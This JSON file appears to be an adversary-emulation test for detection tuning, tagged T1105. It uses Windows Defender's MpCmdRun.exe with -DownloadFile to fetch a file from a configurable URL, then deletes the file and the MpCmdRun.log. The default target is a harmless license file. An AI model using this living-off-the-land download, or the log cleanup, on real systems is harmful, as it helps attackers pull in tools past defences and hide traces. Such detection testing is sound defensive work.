{
  "id": "815bef8b-bf91-4b67-be4c-abe4c2a94ccc",
  "name": "Download a File with Windows Defender MpCmdRun.exe",
  "description": "Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).\nThe input arguments \"remote_file\" and \"local_path\" can be used to specify the download URL and the name of the output file.\nBy default, the test downloads the Atomic Red Team license file to the temp directory.\n\nMore info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "a309bff8-eb84-4636-aa1f-ee609c0acc90",
      "type": "execute-command",
      "data": {
        "command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "32a8db40-6cb2-42f2-8873-fbeaf52e6395",
      "type": "execute-command",
      "data": {
        "command": "del #{local_path} \u003enul 2\u003e\u00261\ndel %temp%\\MpCmdRun.log \u003enul 2\u003e\u00261",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "697db3b0-dfb3-45d4-a0f4-afdb2edfd08f",
      "name": "Check dependency 1/1",
      "description": "Must have a Windows Defender version with MpCmdRun.exe installed",
      "type": "execute-command",
      "data": {
        "command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe /?  \u003enul 2\u003e\u00261\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "2d5056b4-4a7c-4c32-b8df-4882cd830899",
      "name": "Resolve dependency 1/1",
      "description": "Must have a Windows Defender version with MpCmdRun.exe installed",
      "type": "execute-command",
      "data": {
        "command": "Echo \"A version of Windows Defender with MpCmdRun.exe must be installed manually\"",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "f0173d2f-0614-4a78-be78-9e812b13a817",
      "name": "Re-check dependency 1/1",
      "description": "Must have a Windows Defender version with MpCmdRun.exe installed",
      "type": "execute-command",
      "data": {
        "command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe /?  \u003enul 2\u003e\u00261\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "a309bff8-eb84-4636-aa1f-ee609c0acc90",
      "p": "on-success",
      "o": "32a8db40-6cb2-42f2-8873-fbeaf52e6395"
    },
    {
      "s": "a309bff8-eb84-4636-aa1f-ee609c0acc90",
      "p": "on-failure",
      "o": "32a8db40-6cb2-42f2-8873-fbeaf52e6395"
    },
    {
      "s": "697db3b0-dfb3-45d4-a0f4-afdb2edfd08f",
      "p": "on-success",
      "o": "a309bff8-eb84-4636-aa1f-ee609c0acc90"
    },
    {
      "s": "697db3b0-dfb3-45d4-a0f4-afdb2edfd08f",
      "p": "on-failure",
      "o": "2d5056b4-4a7c-4c32-b8df-4882cd830899"
    },
    {
      "s": "2d5056b4-4a7c-4c32-b8df-4882cd830899",
      "p": "on-success",
      "o": "f0173d2f-0614-4a78-be78-9e812b13a817"
    },
    {
      "s": "f0173d2f-0614-4a78-be78-9e812b13a817",
      "p": "on-failure",
      "o": "a309bff8-eb84-4636-aa1f-ee609c0acc90"
    }
  ],
  "tags": [
    "T1105"
  ],
  "input_arguments": [
    {
      "name": "remote_file",
      "type": "url",
      "description": "URL of file to download",
      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
    },
    {
      "name": "local_path",
      "type": "path",
      "description": "Location to save downloaded file",
      "value": "%temp%\\Atomic-license.txt"
    }
  ]
}